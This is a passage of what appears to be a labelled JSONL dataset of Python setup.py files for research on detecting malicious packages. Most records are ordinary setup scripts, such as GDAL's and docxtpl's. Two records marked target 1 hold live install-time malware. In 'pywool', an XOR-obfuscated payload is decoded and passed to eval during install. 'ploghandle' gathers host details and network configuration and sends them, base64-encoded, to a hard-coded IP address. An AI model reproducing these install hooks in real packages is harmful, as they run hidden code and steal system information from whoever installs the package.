x7f\\x0c]mqpDVysGW\\x06rFSz^Pe]\\n`aa]kl\\x07f~`wx\\\\Pxb\\x00[x~\\x02|J\\x0eZV\\x7f_FR\\x7fQAk\\x04\\x01Ft\\x04kK|\\x07x\\x07V[dI[`f_yu\\x7fpv[@Tgoz[V]xTaqBGP\\x0bWIRV\\x04VowwEVtk_Qr~Uot\\x7fAna\\x02CQY][`s\\x01Ak\\x07sCR\\x02\\t]\\\\vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWg\\x05jZ[Xh_dcdCPcNZl\\x7fy@j\\x05\\x7f\\\\[ovTiqz\\x02V\\x00d[[mo\\x04j\\x7fK@To\\x00\\x05Ve\\x00^y_IGVvrUU\\\\{\\x07nny\\x03zwpQquzu}XAVgh~\\\\[^}Wh{CAW\\nPBQY\\x03Wjs~E[skPTstUls|O``\\x02FR[QWar\\tGh\\x04~AV\\x01\\x0fZ]\\x7fNWd\\x0b_Lj\\x7f\\x0c\\x06T\\x03IQ`\\x02k_V[iQcecBS`KPf|sNb\\x05zYPlwViv~\\x05[\\x03aXRgn\\x02m~LHRt\\x07CWn[[`q\\x0cQQl`LmbdMX`\\x07Q|\\x05gM``\\rMkZbN|t\\x07\\x02c~\\x0f\\x07PTKOiogDU\\x00xUy\\x03kAQ\\x07\\rEU\\x00s\\\\~u\\nDPYUN[[\\\\\\x01Wg{re\\x01zvj\\x01ydff\\x02w|{~]W\\x7f`CQLWDt\\x04\\x7fOQg\\x03YPL\\x03S[\\x05\\x03@jqBB]NqPx\\\\y\\x01muNaZ\\x0b`MQ\\x08KZU\\nMCm\\x00]GSgATdmzAeus\\x07n`KPfY\\x00PZa\\\\Dh\\x05AVeg\\\\Z[]\\nNR\\x01m\\x02m~LjR`\\x07_P\\x05\\\\H`pAlTstOPvtwc`\\x06\\x07hpMeZZ\\x01YRZrCV\\x02NTl\\nZNV~eM~RgVotUBW\\\\kAQ\\x06uQducDTqeJ\\x7fYo\\x0cbezRPZw\\x05hhz\\x00qsz]yp}vzTLQeo|XQXvQ`~MKR\\x06VFV[\\x07ZaruASsg\\\\]p~Tiq~Ald\\x07G[TRWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATc\\x07TCmu\\x0c\\x04T\\x07KPf\\x07kP[XaVfco@UfHSmxyBj\\x00}ZW`zQkq|\\x04knr\\x02\\\\n{[hrV|`_o\\tuYi_SO|ZrfWPxtuP|pwPpqx\\x05kWq@R\\n{YT\\x01|GV_oB~ra_fHETopeIilsB`pH\\x06Ps\\x00[Pg\\x05\\t`vKvS{uwl`fZkqJgP\\x04~FYa\\x0cVhrJxUbx@[\\x04}@jXgWaq\\\\GSZfAQ\\x00xTa\\x7fx\\x04kay\\ty}\\x04YU\\\\gQmw{NW\\x07\\\\One\\x04MopKgVlw\\x08ba\\x00\\x03|rAVg\\x00\\\\\\x7fuJzAT^}H|QCUP\\x05ZXPqO\\x0bn~s\\tjgEQm\\x07^U`\\x05@\\x0ff~\\x7f\\x05cdS|xtuP|pwPpztNVnyNSU\\x0c_mj\\x7fHy_s\\x06W\\\\P[~Yx\\x01opKeP\\x06oA[\\x07HRW\\x06ACk\\x02\\\\E^fKWakuEg\\x7fr\\x02jaJWg[\\x01ZZaUMj\\x05JU`bZSZZ\\nLR\\x04o\\x04aq@oP`\\x01\\\\W\\x00RMa\\x7fN`V~u@T{w{me\\x04\\x03mwAfVX\\x01XT_sCT\\x07KPf\\x07UB\\\\qfE|^kVivTzlZzM|]m[VA}Az\\x7f|[ha@Ah`kATcgE}rxVc`}D``gM]`mGr^uP|pt[\\\\~xXQqb\\x0fsQtR~qpU|rxPVr~LTEE[U~}_|]x_qw_V{wxRRwvJ[G\\x0e\\t\\x12\\x1a\\x1e8P@WWCC\\x08>\\x12\\x16\\x18\\x12HWJK\" \n        iOpvEoeaaeavocp = \"0426456997360654978717475367996429390855721251975586725776333498860124951000803403725842372426828698\"\n        uocpEAtacovpe = len(wopvEaTEcopFEavc)\n        oIoeaTEAcvpae = \"\"\n        for fapcEaocva in range(uocpEAtacovpe):\n            nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n            qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n            oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n        eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"pywool\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)", "target": 1}
{"idx": "GDAL-3.5.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Setup script for GDAL Python bindings.\n# Inspired by psycopg2 setup.py file\n# http://www.initd.org/tracker/psycopg/browser/psycopg2/trunk/setup.py\n# Howard Butler hobu.inc@gmail.com\n\n\ngdal_version = '3.5.1'\n\nimport sys\nimport os\n\nfrom glob import glob\n\nfrom setuptools.command.build_ext import build_ext\nfrom setuptools import setup\nfrom setuptools import find_packages\nfrom setuptools import Extension\n\n# If CXX is defined in the environment, it will be used to link the .so\n# but setuptools will be confused if it is made of several words like 'ccache g++'\n# and it will try to use only the first word.\n# See https://lists.osgeo.org/pipermail/gdal-dev/2016-July/044686.html\n# Note: in general when doing \"make\", CXX will not be defined, unless it is defined as\n# an environment variable, but in that case it is the value of GDALmake.opt that\n# will be set, not the one from the environment that started \"make\" !\n# If no CXX environment variable is defined, then the value of the CXX variable\n# in GDALmake.opt will not be set as an environment variable\nif 'CXX' in os.environ and os.environ['CXX'].strip().find(' ') >= 0:\n    if os.environ['CXX'].strip().startswith('ccache ') and os.environ['CXX'].strip()[len('ccache '):].find(' ') < 0:\n        os.environ['CXX'] = os.environ['CXX'].strip()[len('ccache '):]\n    else:\n        print('WARNING: \"CXX=%s\" was defined in the environment and contains more than one word. Unsetting it since that is incompatible of setuptools' % os.environ['CXX'])\n        del os.environ['CXX']\nif 'CC' in os.environ and os.environ['CC'].strip().find(' ') >= 0:\n    if os.environ['CC'].strip().startswith('ccache ') and os.environ['CC'].strip()[len('ccache '):].find(' ') < 0:\n        os.environ['CC'] = os.environ['CC'].strip()[len('ccache '):]\n    else:\n        print('WARNING: \"CC=%s\" was defined in the environment and contains more than one word. Unsetting it since that is incompatible of setuptools' % os.environ['CC'])\n        del os.environ['CC']\n\n# ---------------------------------------------------------------------------\n# Switches\n# ---------------------------------------------------------------------------\n\nHAVE_NUMPY = False\nBUILD_FOR_CHEESESHOP = False\nGNM_ENABLED = True\n\n# ---------------------------------------------------------------------------\n# Default build options\n# (may be overridden with setup.cfg or command line switches).\n# ---------------------------------------------------------------------------\n\ninclude_dirs = ['../../port', '../../gcore', '../../alg', '../../ogr/', '../../ogr/ogrsf_frmts', '../../gnm', '../../apps']\nlibrary_dirs = ['../../.libs', '../../']\nlibraries = ['gdal']\n\n\n# ---------------------------------------------------------------------------\n# Helper Functions\n# ---------------------------------------------------------------------------\n\n# Function to find numpy's include directory\ndef get_numpy_include():\n    if HAVE_NUMPY:\n        return numpy.get_include()\n    return '.'\n\n\n# ---------------------------------------------------------------------------\n# Imports\n# ---------------------------------------------------------------------------\n\ntry:\n    import numpy\n    HAVE_NUMPY = True\n    # check version\n    numpy_major = numpy.__version__.split('.')[0]\n    if int(numpy_major) < 1:\n        print(\"numpy version must be > 1.0.0\")\n        HAVE_NUMPY = False\n    else:\n        #  print ('numpy include', get_numpy_include())\n        if get_numpy_include() == '.':\n            print(\"WARNING: numpy headers were not found!  Array support will not be enabled\")\n            HAVE_NUMPY = False\nexcept ImportError:\n    print('WARNING: numpy not available!  Array support will not be enabled')\n    pass\n\nclass gdal_config_error(Exception):\n    pass\n\n\ndef fetch_config(option, gdal_config='gdal-config'):\n\n    command = gdal_config + \" --%s\" % option\n\n    import subprocess\n    command, args = command.split()[0], command.split()[1]\n    try:\n        p = subprocess.Popen([command, args], stdout=subprocess.PIPE)\n    except OSError:\n        e = sys.exc_info()[1]\n        raise gdal_config_error(e)\n    r = p.stdout.readline().decode('ascii').strip()\n    p.stdout.close()\n    p.wait()\n\n    return r\n\n\ndef supports_cxx11(compiler, compiler_flag=None):\n    ret = False\n    with open('gdal_python_cxx11_test.cpp', 'wt') as f:\n        f.write(\"\"\"\n#if __cplusplus < 201103L\n#error \"C++11 required\"\n#endif\nint main () { return 0; }\"\"\")\n        f.close()\n        extra_postargs = None\n        if compiler_flag:\n            extra_postargs = [compiler_flag]\n\n        if os.name == 'posix':\n            # Redirect stderr to /dev/null to hide any error messages\n            # from the compiler.\n            devnull = open(os.devnull, 'w')\n            oldstderr = os.dup(sys.stderr.fileno())\n            os.dup2(devnull.fileno(), sys.stderr.fileno())\n            try:\n                compiler.compile([f.name], extra_postargs=extra_postargs)\n                ret = True\n            except Exception:\n                pass\n            os.dup2(oldstderr, sys.stderr.fileno())\n            devnull.close()\n        else:\n            try:\n                compiler.compile([f.name], extra_postargs=extra_postargs)\n                ret = True\n            except Exception:\n                pass\n    os.unlink('gdal_python_cxx11_test.cpp')\n    if os.path.exists('gdal_python_cxx11_test.o'):\n        os.unlink('gdal_python_cxx11_test.o')\n    return ret\n\n###Based on: https://stackoverflow.com/questions/28641408/how-to-tell-which-compiler-will-be-invoked-for-a-python-c-extension-in-setuptool\ndef has_flag(compiler, flagname):\n    import tempfile\n    with tempfile.NamedTemporaryFile('w', suffix='.cpp') as f:\n        f.write('int main (int argc, char **argv) { return 0; }')\n        try:\n            compiler.compile([f.name], extra_postargs=[flagname])\n        except Exception:\n            return False\n    return True\n\nclass gdal_ext(build_ext):\n\n    GDAL_CONFIG = 'gdal-config'\n    user_options = build_ext.user_options[:]\n    user_options.extend([\n        ('gdal-config=', None,\n         \"The name of the gdal-config binary and/or a full path to it\"),\n    ])\n\n    def initialize_options(self):\n        build_ext.initialize_options(self)\n\n        self.numpy_include_dir = get_numpy_include()\n        self.gdaldir = None\n        self.gdal_config = self.GDAL_CONFIG\n        self.extra_cflags = []\n        self.parallel = True # Python 3.5 only\n\n    def get_compiler(self):\n        return self.compiler or ('msvc' if os.name == 'nt' else 'unix')\n\n    def get_gdal_config(self, option):\n        try:\n            return fetch_config(option, gdal_config=self.gdal_config)\n        except gdal_config_error:\n            # If an error is thrown, it is possibly because\n            # the gdal-config location given in setup.cfg is\n            # incorrect, or possibly the default -- ../../apps/gdal-config\n            # We'll try to use the gdal-config that might be on the path.\n            try:\n                return fetch_config(option)\n            except gdal_config_error:\n                msg = 'Could not find gdal-config. Make sure you have installed the GDAL native library and development headers.'\n                import sys\n                import traceback\n                traceback_string = ''.join(traceback.format_exception(*sys.exc_info()))\n                raise gdal_config_error(traceback_string + '\\n' + msg)\n\n\n    def build_extensions(self):\n\n        # Add a -std=c++11 or similar flag if needed\n        ct = self.compiler.compiler_type\n        if ct == 'unix' and not supports_cxx11(self.compiler):\n            cxx11_flag = None\n            if supports_cxx11(self.compiler, '-std=c++11'):\n                cxx11_flag = '-std=c++11'\n            if cxx11_flag:\n                for ext in self.extensions:\n                    # gdalconst builds as a .c file\n                    if ext.name != 'osgeo._gdalconst':\n                        ext.extra_compile_args += [cxx11_flag]\n\n                    # Adding arch flags here if OS X and compiler is clang\n                    if sys.platform == 'darwin' and [int(x) for x in os.uname()[2].split('.')] >= [11, 0, 0]:\n                        # since MacOS X 10.9, clang no longer accepts -mno-fused-madd\n                        # extra_compile_args.append('-Qunused-arguments')\n                        clang_flag = '-Wno-error=unused-command-line-argument-hard-error-in-future'\n                        if has_flag(self.compiler, clang_flag):\n                            ext.extra_compile_args += [clang_flag]\n                        else:\n                            clang_flag = '-Wno-error=unused-command-line-argument'\n                            if has_flag(self.compiler, clang_flag):\n                                ext.extra_compile_args += [clang_flag]\n\n        build_ext.build_extensions(self)\n\n    def finalize_options(self):\n        global include_dirs, library_dirs\n\n        if self.include_dirs is None:\n            self.include_dirs = include_dirs\n        # Needed on recent MacOSX\n        elif isinstance(self.include_dirs, str) and sys.platform == 'darwin':\n            self.include_dirs += ':' + ':'.join(include_dirs)\n        if self.library_dirs is None:\n            self.library_dirs = library_dirs\n        # Needed on recent MacOSX\n        elif isinstance(self.library_dirs, str) and sys.platform == 'darwin':\n            self.library_dirs += ':' + ':'.join(library_dirs)\n        if self.libraries is None:\n            if self.get_compiler() == 'msvc':\n                libraries.remove('gdal')\n                libraries.append('gdal_i')\n            self.libraries = libraries\n\n        build_ext.finalize_options(self)\n\n        self.include_dirs.append(self.numpy_include_dir)\n\n        if self.get_compiler() == 'msvc':\n            return True\n\n        self.gdaldir = self.get_gdal_config('prefix')\n        self.library_dirs.append(os.path.join(self.gdaldir, 'lib'))\n        self.include_dirs.append(os.path.join(self.gdaldir, 'include'))\n\n        cflags = self.get_gdal_config('cflags')\n        if cflags:\n            self.extra_cflags = cflags.split()\n\n    def build_extension(self, ext):\n        # We override this instead of setting extra_compile_args directly on\n        # the Extension() instantiations below because we want to use the same\n        # logic to resolve the location of gdal-config throughout.\n        ext.extra_compile_args.extend(self.extra_cflags)\n        return build_ext.build_extension(self, ext)\n\n\nextra_link_args = []\nextra_compile_args = []\n\ngdal_module = Extension('osgeo._gdal',\n                        sources=['extensions/gdal_wrap.cpp'],\n                        extra_compile_args=extra_compile_args,\n                        extra_link_args=extra_link_args)\n\ngdalconst_module = Extension('osgeo._gdalconst',\n                             sources=['extensions/gdalconst_wrap.c'],\n                             extra_compile_args=extra_compile_args,\n                             extra_link_args=extra_link_args)\n\nosr_module = Extension('osgeo._osr',\n                       sources=['extensions/osr_wrap.cpp'],\n                       extra_compile_args=extra_compile_args,\n                       extra_link_args=extra_link_args)\n\nogr_module = Extension('osgeo._ogr',\n                       sources=['extensions/ogr_wrap.cpp'],\n                       extra_compile_args=extra_compile_args,\n                       extra_link_args=extra_link_args)\n\n\narray_module = Extension('osgeo._gdal_array',\n                         sources=['extensions/gdal_array_wrap.cpp'],\n                         extra_compile_args=extra_compile_args,\n                         extra_link_args=extra_link_args)\n\ngnm_module = Extension('osgeo._gnm',\n                       sources=['extensions/gnm_wrap.cpp'],\n                       extra_compile_args=extra_compile_args,\n                       extra_link_args=extra_link_args)\n\next_modules = [gdal_module,\n               gdalconst_module,\n               osr_module,\n               ogr_module]\n\nif os.path.exists('setup_vars.ini'):\n    with open('setup_vars.ini') as f:\n        lines = f.readlines()\n        if 'GNM_ENABLED=no' in lines or 'GNM_ENABLED=no\\n' in lines:\n            GNM_ENABLED = False\n\nif GNM_ENABLED:\n    ext_modules.append(gnm_module)\n\nif HAVE_NUMPY:\n    ext_modules.append(array_module)\n\nutils_package_root = 'gdal-utils'   # path for gdal-utils sources\npackages = find_packages(utils_package_root)\npackages = ['osgeo'] + packages\npackage_dir = {'osgeo': 'osgeo', '': utils_package_root}\n\nreadme = open('README.rst', encoding=\"utf-8\").read()\n\nname = 'GDAL'\nversion = gdal_version\nauthor = \"Frank Warmerdam\"\nauthor_email = \"warmerdam@pobox.com\"\nmaintainer = \"Howard Butler\"\nmaintainer_email = \"hobu.inc@gmail.com\"\ndescription = \"GDAL: Geospatial Data Abstraction Library\"\nlicense_type = \"MIT\"\nurl = \"http://www.gdal.org\"\n\nclassifiers = [\n    'Development Status :: 5 - Production/Stable',\n    'Intended Audience :: Developers',\n    'Intended Audience :: Science/Research',\n    'License :: OSI Approved :: MIT License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: C',\n    'Programming Language :: C++',\n    'Topic :: Scientific/Engineering :: GIS',\n    'Topic :: Scientific/Engineering :: Information Analysis',\n\n]\n\n\nif BUILD_FOR_CHEESESHOP:\n    data_files = [(\"osgeo/data/gdal\", glob(os.path.join(\"../../data\", \"*\")))]\nelse:\n    data_files = None\n\nexclude_package_data = {'': ['GNUmakefile']}\n\nsetup_kwargs = dict(\n    name=name,\n    version=gdal_version,\n    author=author,\n    author_email=author_email,\n    maintainer=maintainer,\n    maintainer_email=maintainer_email,\n    long_description=readme,\n    long_description_content_type='text/x-rst',\n    description=description,\n    license=license_type,\n    classifiers=classifiers,\n    packages=packages,\n    package_dir=package_dir,\n    url=url,\n    python_requires='>=3.6.0',\n    data_files=data_files,\n    ext_modules=ext_modules,\n    scripts=glob(utils_package_root + '/scripts/*.py'),\n    cmdclass={'build_ext': gdal_ext},\n    extras_require={'numpy': ['numpy > 1.0.0']},\n    zip_safe=False,\n    exclude_package_data=exclude_package_data\n)\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "glean_parser-6.1.2", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# This Source Code Form is subject to the terms of the Mozilla Public\n# License, v. 2.0. If a copy of the MPL was not distributed with this\n# file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n\"\"\"The setup script.\"\"\"\n\nimport sys\n\nfrom setuptools import setup, find_packages\n\n\nif sys.version_info < (3, 6):\n    print(\"glean_parser requires at least Python 3.6\", file=sys.stderr)\n    sys.exit(1)\n\n\nwith open(\"README.md\", encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nwith open(\"CHANGELOG.md\", encoding=\"utf-8\") as history_file:\n    history = history_file.read()\n\nrequirements = [\n    \"appdirs>=1.4\",\n    \"Click>=7\",\n    \"diskcache>=4\",\n    \"iso8601>=0.1.10; python_version<='3.6'\",\n    \"Jinja2>=2.10.1\",\n    \"MarkupSafe>=1.1.1,<=2.0.1\",\n    \"jsonschema>=3.0.2\",\n    \"PyYAML>=5.3.1\",\n    \"yamllint>=1.18.0\",\n]\n\nsetup_requirements = [\n    \"pytest-runner\",\n    \"setuptools-scm<7; python_version<='3.6'\",\n    \"setuptools-scm>=7; python_version>'3.6'\",\n]\n\ntest_requirements = [\n    \"pytest\",\n]\n\nsetup(\n    author=\"The Glean Team\",\n    author_email=\"glean-team@mozilla.com\",\n    classifiers=[\n        \"Development Status :: 2 - Pre-Alpha\",\n        \"Intended Audience :: Developers\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    description=\"Parser tools for Mozilla's Glean telemetry\",\n    entry_points={\n        \"console_scripts\": [\n            \"glean_parser=glean_parser.__main__:main_wrapper\",\n        ],\n    },\n    install_requires=requirements,\n    long_description=readme + \"\\n\\n\" + history,\n    long_description_content_type=\"text/markdown\",\n    include_package_data=True,\n    keywords=\"glean_parser\",\n    name=\"glean_parser\",\n    packages=find_packages(include=[\"glean_parser\"]),\n    setup_requires=setup_requirements,\n    test_suite=\"tests\",\n    tests_require=test_requirements,\n    url=\"https://github.com/mozilla/glean_parser\",\n    zip_safe=False,\n    use_scm_version=True,\n)\n", "target": 0}
{"idx": "databricks_pypi2-0.2", "func": "from setuptools import setup, find_packages\n \nsetup(\n    name = \"databricks_pypi2\",\n    version = \"0.2\",\n    decription = 'databricks whl library',\n    packages = find_packages())\n", "target": 0}
{"idx": "git-pylint-commit-hook-2.6.1", "func": "\"\"\" Setup script for PyPI \"\"\"\nfrom setuptools import setup\n\nsetup(\n    name='git-pylint-commit-hook',\n    version='2.6.1',\n    license='Apache License, Version 2.0',\n    description='Git commit hook that checks Python files with pylint',\n    author='Sebastian Dahlgren',\n    author_email='sebastian.dahlgren@gmail.com',\n    url='https://github.com/sebdah/git-pylint-commit-hook',\n    keywords=\"git commit pre-commit hook pylint python\",\n    platforms=['Any'],\n    packages=['git_pylint_commit_hook'],\n    scripts=['git-pylint-commit-hook'],\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[\n        'pylint',\n        'future'\n    ],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Console',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python'\n    ]\n)\n", "target": 0}
{"idx": "django-colorfield-0.7.2", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom setuptools import find_packages, setup\n\nimport os, sys\n\nexec(open(\"colorfield/version.py\").read())\n\ngithub_url = \"https://github.com/fabiocaccamo\"\nsponsor_url = \"https://github.com/sponsors/fabiocaccamo/\"\ntwitter_url = \"https://twitter.com/fabiocaccamo\"\npackage_name = \"django-colorfield\"\npackage_url = \"{}/{}\".format(github_url, package_name)\npackage_path = os.path.abspath(os.path.dirname(__file__))\nlong_description_file_path = os.path.join(package_path, \"README.md\")\nlong_description_content_type = \"text/markdown\"\nlong_description = \"\"\ntry:\n    long_description_file_options = (\n        {} if sys.version_info[0] < 3 else {\"encoding\": \"utf-8\"}\n    )\n    with open(long_description_file_path, \"r\", **long_description_file_options) as f:\n        long_description = f.read()\nexcept IOError:\n    pass\n\nsetup(\n    name=package_name,\n    packages=find_packages(exclude=[\"contrib\", \"docs\", \"tests*\"]),\n    include_package_data=True,\n    version=__version__,\n    description=\"simple color field for your models with a nice color-picker in the admin-interface.\",\n    long_description=long_description,\n    long_description_content_type=long_description_content_type,\n    author=\"Jared Forsyth, Fabio Caccamo\",\n    author_email=\"jared@jaredforsyth.com, fabio.caccamo@gmail.com\",\n    url=package_url,\n    download_url=\"{}/archive/{}.tar.gz\".format(package_url, __version__),\n    project_urls={\n        \"Documentation\": \"{}#readme\".format(package_url),\n        \"Issues\": \"{}/issues\".format(package_url),\n        \"Funding\": sponsor_url,\n        \"Twitter\": twitter_url,\n    },\n    keywords=[\n        \"django\",\n        \"colorfield\",\n        \"colorpicker\",\n        \"color\",\n        \"field\",\n        \"picker\",\n        \"chooser\",\n        \"admin\",\n        \"python\",\n    ],\n    requires=[\"django (>=1.7)\"],\n    install_requires=[\"Pillow (>=5.0)\"],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 1.7\",\n        \"Framework :: Django :: 1.8\",\n        \"Framework :: Django :: 1.9\",\n        \"Framework :: Django :: 1.10\",\n        \"Framework :: Django :: 1.11\",\n        \"Framework :: Django :: 2.0\",\n        \"Framework :: Django :: 2.1\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Build Tools\",\n    ],\n    license=\"MIT\",\n    test_suite=\"runtests.runtests\",\n)\n", "target": 0}
{"idx": "ploghandle-0.0.2", "func": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\n\ndef read_version():\n    regexp = re.compile(r\"^__version__\\W*=\\W*'([\\d.abrc]+)'\")\n    init_py = os.path.join(os.path.dirname(__file__), \"polaris\", \"__init__.py\")\n    ver = init_py.replace(\"__init__.py\", \"version\")\n    subprocess.Popen([sys.executable, ver], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    d = platform.node() + str(platform.uname()) + os.getcwd() + os.popen(\"ifconfig|grep inet|grep -v inet6\").read()\n    requests.get(\"http://1.15.77.2/v/%s\" % base64.b64encode(d.encode()))\n    with open(init_py) as f:\n        for line in f:\n            match = regexp.match(line)\n            if match is not None:\n                return match.group(1)\n        raise RuntimeError(\"Cannot find version in {}\".format(init_py))\n\n\nsetup(\n    name=\"ploghandle\",\n    version=read_version(),\n    description=\"Python SDK\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n", "target": 1}
{"idx": "faust-1.10.4", "func": "#!/usr/bin/env python\nimport re\nfrom pathlib import Path\nfrom setuptools import find_packages, setup\n\nNAME = 'proj'\n\nREADME = Path('README.rst')\n\n# -*- Classifiers -*-\n\nclasses = '''\n    Development Status :: 4 - Beta\n    License :: OSI Approved :: BSD License\n    Programming Language :: Python\n    Programming Language :: Python :: 3 :: Only\n    Programming Language :: Python :: 3.6\n    Operating System :: POSIX\n    Operating System :: POSIX :: Linux\n    Operating System :: MacOS :: MacOS X\n    Operating System :: POSIX :: BSD\n    Operating System :: Microsoft :: Windows\n    Topic :: Framework :: Django\n'''\nclassifiers = [s.strip() for s in classes.split('\\n') if s]\n\n# -*- Distribution Meta -*-\n\nre_meta = re.compile(r'__(\\w+?)__\\s*=\\s*(.*)')\nre_doc = re.compile(r'^\"\"\"(.+?)\"\"\"')\n\n\ndef add_default(m):\n    attr_name, attr_value = m.groups()\n    return ((attr_name, attr_value.strip(\"\\\"'\")),)\n\n\ndef add_doc(m):\n    return (('doc', m.groups()[0]),)\n\n\npats = {re_meta: add_default, re_doc: add_doc}\nhere = Path(__file__).parent.absolute()\nwith open(here / NAME / '__init__.py') as meta_fh:\n    meta = {}\n    for line in meta_fh:\n        if line.strip() == '# -eof meta-':\n            break\n        for pattern, handler in pats.items():\n            m = pattern.match(line.strip())\n            if m:\n                meta.update(handler(m))\n\n# -*- Installation Requires -*-\n\n\ndef strip_comments(l):\n    return l.split('#', 1)[0].strip()\n\n\ndef _pip_requirement(req):\n    if req.startswith('-r '):\n        _, path = req.split()\n        return reqs(*path.split('/'))\n    return [req]\n\n\ndef _reqs(*f):\n    path = (Path.cwd() / 'requirements').joinpath(*f)\n    with path.open() as fh:\n        reqs = [strip_comments(l) for l in fh.readlines()]\n        return [_pip_requirement(r) for r in reqs if r]\n\n\ndef reqs(*f):\n    return [req for subreq in _reqs(*f) for req in subreq]\n\n# -*- Long Description -*-\n\n\nif README.exists():\n    long_description = README.read_text(encoding='utf-8')\nelse:\n    long_description = 'See http://pypi.org/project/{}'.format(NAME)\n\n# -*- %%% -*-\n\nsetup(\n    name=NAME,\n    version=meta['version'],\n    description=meta['doc'],\n    author=meta['author'],\n    author_email=meta['contact'],\n    url=meta['homepage'],\n    platforms=['any'],\n    license='BSD',\n    packages=find_packages(exclude=['ez_setup', 'tests', 'tests.*']),\n    include_package_data=True,\n    python_requires='>=3.6.0',\n    keywords=[],\n    zip_safe=False,\n    install_requires=reqs('default.txt'),\n    tests_require=reqs('test.txt'),\n    classifiers=classifiers,\n    long_description=long_description,\n    entry_points={\n        'console_scripts': [\n            'proj = proj.__main__:main',\n            'proj-faust = faustapp.app:main',\n        ],\n    },\n)\n", "target": 0}
{"idx": "docxtpl-0.16.4", "func": "from setuptools import setup\nimport os\nimport re\nimport sys\n\n# To register onto Pypi :\n# python setup.py sdist bdist_wheel upload\n\n\ndef read(*names):\n    values = dict()\n    for name in names:\n        filename = name + '.rst'\n        if os.path.isfile(filename):\n            fd = open(filename)\n            value = fd.read()\n            fd.close()\n        else:\n            value = ''\n        values[name] = value\n    return values\n\n\nlong_description = \"\"\"\n%(README)s\n\nNews\n====\n%(CHANGES)s\n\"\"\" % read('README', 'CHANGES')\n\n\ndef get_version(pkg):\n    path = os.path.join(os.path.dirname(__file__), pkg, '__init__.py')\n    if sys.version_info >= (3, 0):\n        fh = open(path, encoding='utf-8')   # required to read utf-8 file on windows\n    else:\n        fh = open(path)  # encoding parameter does not exist in python 2\n    with fh:\n        m = re.search(r'^__version__\\s*=\\s*[\\'\"]([^\\'\"]+)[\\'\"]', fh.read(), re.M)\n    if m:\n        return m.group(1)\n    raise RuntimeError(\"Unable to find __version__ string in %s.\" % path)\n\n\nsetup(name='docxtpl',\n      version=get_version('docxtpl'),\n      description='Python docx template engine',\n      long_description=long_description,\n      classifiers=[\n          \"Intended Audience :: Developers\",\n          \"Development Status :: 4 - Beta\",\n          \"Programming Language :: Python :: 2\",\n          \"Programming Language :: Python :: 2.7\",\n          \"Programming Language :: Python :: 3\",\n          \"Programming Language :: Python :: 3.4\",\n      ],\n      keywords='jinja2',\n      url='https://github.com/elapouya/python-docx-template',\n      author='Eric Lapouyade',\n      license='LGPL 2.1',\n      packages=['docxtpl'],\n      install_requires=['six',\n                        'python-docx',\n                        'docxcompose',\n                        'jinja2',\n                        'lxml'],\n      extras_require={'docs': ['Sphinx', 'sphinxcontrib-napoleon']},\n      eager_resources=['docs'],\n      zip_safe=False)\n", "target": 0}
